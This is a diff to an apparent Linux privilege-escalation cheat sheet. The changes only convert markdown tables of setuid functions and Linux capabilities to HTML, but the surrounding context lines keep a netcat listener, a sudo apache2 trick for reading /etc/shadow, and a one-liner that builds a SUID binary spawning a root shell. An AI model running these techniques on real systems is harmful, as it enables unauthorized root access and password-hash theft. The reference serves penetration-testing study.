@@ -509,7 +509,7 @@ nc -lnvp 8081
 
 #### apache2
 
-You can get a shell or edit system files, but you can _**view** _ them
+You can get a shell or edit system files, but you can _**view**_ them
 
 ```
 sudo apache2 -f /etc/shadow
@@ -517,11 +517,7 @@ sudo apache2 -f /etc/shadow
 
 ## Create a SUID binary
 
-| Function   | Description                                             |
-| ---------- | ------------------------------------------------------- |
-| setreuid() | sets real and effective user IDs of the calling process |
-| setuid()   | sets the effective user ID of the calling process       |
-| setgid()   | sets the effective group ID of the calling process      |
+<table><thead><tr><th width="121.5">Function</th><th>Description</th></tr></thead><tbody><tr><td>setreuid()</td><td>sets real and effective user IDs of the calling process</td></tr><tr><td>setuid()</td><td>sets the effective user ID of the calling process</td></tr><tr><td>setgid()</td><td>sets the effective group ID of the calling process</td></tr></tbody></table>
 
 ```bash
 print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
@@ -670,23 +666,7 @@ sh-5.0# id
 uid=0(root) gid=1000(swissky)
 ```
 
-| Capabilities name       | Description                                                                                                                                 |
-| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
-| CAP\_AUDIT\_CONTROL     | Allow to enable/disable kernel auditing                                                                                                     |
-| CAP\_AUDIT\_WRITE       | Helps to write records to kernel auditing log                                                                                               |
-| CAP\_BLOCK\_SUSPEND     | This feature can block system suspends                                                                                                      |
-| CAP\_CHOWN              | Allow user to make arbitrary change to files UIDs and GIDs                                                                                  |
-| CAP\_DAC\_OVERRIDE      | This helps to bypass file read, write and execute permission checks                                                                         |
-| CAP\_DAC\_READ\_SEARCH  | This only bypasses file and directory read/execute permission checks                                                                        |
-| CAP\_FOWNER             | This enables bypass of permission checks on operations that normally require the filesystem UID of the process to match the UID of the file |
-| CAP\_KILL               | Allow the sending of signals to processes belonging to others                                                                               |
-| CAP\_SETGID             | Allow changing of the GID                                                                                                                   |
-| CAP\_SETUID             | Allow changing of the UID                                                                                                                   |
-| CAP\_SETPCAP            | Helps to transferring and removal of current set to any PID                                                                                 |
-| CAP\_IPC\_LOCK          | This helps to lock memory                                                                                                                   |
-| CAP\_MAC\_ADMIN         | Allow MAC configuration or state changes                                                                                                    |
-| CAP\_NET\_RAW           | Use RAW and PACKET sockets                                                                                                                  |
-| CAP\_NET\_BIND\_SERVICE | SERVICE Bind a socket to internet domain privileged ports                                                                                   |
+<table><thead><tr><th width="246">Capabilities name</th><th>Description</th></tr></thead><tbody><tr><td>CAP_AUDIT_CONTROL</td><td>Allow to enable/disable kernel auditing</td></tr><tr><td>CAP_AUDIT_WRITE</td><td>Helps to write records to kernel auditing log</td></tr><tr><td>CAP_BLOCK_SUSPEND</td><td>This feature can block system suspends</td></tr><tr><td>CAP_CHOWN</td><td>Allow user to make arbitrary change to files UIDs and GIDs</td></tr><tr><td>CAP_DAC_OVERRIDE</td><td>This helps to bypass file read, write and execute permission checks</td></tr><tr><td>CAP_DAC_READ_SEARCH</td><td>This only bypasses file and directory read/execute permission checks</td></tr><tr><td>CAP_FOWNER</td><td>This enables bypass of permission checks on operations that normally require the filesystem UID of the process to match the UID of the file</td></tr><tr><td>CAP_KILL</td><td>Allow the sending of signals to processes belonging to others</td></tr><tr><td>CAP_SETGID</td><td>Allow changing of the GID</td></tr><tr><td>CAP_SETUID</td><td>Allow changing of the UID</td></tr><tr><td>CAP_SETPCAP</td><td>Helps to transferring and removal of current set to any PID</td></tr><tr><td>CAP_IPC_LOCK</td><td>This helps to lock memory</td></tr><tr><td>CAP_MAC_ADMIN</td><td>Allow MAC configuration or state changes</td></tr><tr><td>CAP_NET_RAW</td><td>Use RAW and PACKET sockets</td></tr><tr><td>CAP_NET_BIND_SERVICE</td><td>SERVICE Bind a socket to internet domain privileged ports</td></tr></tbody></table>
 
 ## Writeable Directories
 
